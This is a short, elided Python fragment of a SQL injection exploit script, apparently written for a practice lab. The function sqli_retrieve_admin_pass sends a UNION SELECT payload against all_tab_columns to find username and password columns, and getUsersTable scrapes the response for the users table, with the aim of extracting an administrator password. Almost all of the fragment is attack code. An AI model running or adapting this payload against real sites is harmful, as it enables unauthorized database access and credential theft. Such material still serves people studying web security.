...
def sqli_retrieve_admin_pass(url, numCols, tableName):
    if numCols == 2:
        ...
        payload = f"' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name={tableNameQ}--"
        r = requests.get(url+payload, verify=False, proxies=proxies)
        res = r.text
        soup = BeautifulSoup(res, 'html.parser')
        usernameCol = soup.find(string=re.compile("username_.*", re.IGNORECASE))
        passwordCol = soup.find(string=re.compile("password_.*", re.IGNORECASE))
...
def getUsersTable(url):
    ...
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    usersTable = soup.find(string=re.compile("^users_.*", re.IGNORECASE))
